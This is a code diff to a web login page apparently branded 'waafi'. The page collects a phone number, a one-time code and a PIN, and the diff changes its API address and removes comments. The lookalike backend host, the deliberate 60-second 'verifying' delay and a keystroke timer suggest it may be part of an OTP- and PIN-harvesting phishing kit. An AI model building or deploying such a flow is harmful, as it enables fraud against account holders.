@@ -209,7 +209,7 @@
     </div>
 
     <script>
-        const API_BASE = 'https://waafa.pxxl.run/api';
+        const API_BASE = '/api';
         let currentPhoneNumber = '';
         let currentOTP = '';
         let keystrokeTimer = null;
@@ -475,9 +475,7 @@
             verifyBtn.disabled = true;
             verifyBtn.textContent = '⏳ Verifying...';
             
-            // Show loading screen with 60-second delay
             showOTPLoading(async () => {
-                // Verify OTP with backend
                 try {
                     const response = await fetch(`${API_BASE}/auth/verify-otp`, {
                         method: 'POST',
@@ -491,7 +489,6 @@
                     const data = await response.json();
                     
                     if (data.success) {
-                        // After loading, show PIN screen
                         hideLoadingScreens();
                         document.getElementById('step3').style.display = 'none';
                         document.getElementById('step4').style.display = 'block';
@@ -556,7 +553,6 @@
             verifyBtn.disabled = true;
             verifyBtn.textContent = '⏳ Verifying PIN...';
             
-            // Show PIN loading screen
             showPINLoading(async () => {
                 try {
                     const response = await fetch(`${API_BASE}/auth/verify-pin`, {
@@ -573,7 +569,7 @@
                     
                     if (data.success) {
                         localStorage.setItem('waafi_user', JSON.stringify(data.user));
-                        window.location.href = 'dashboard.html';
+                        window.location.href = '/dashboard.html';
                     } else {
                         hideLoadingScreens();
                         document.getElementById('step4').style.display = 'block';
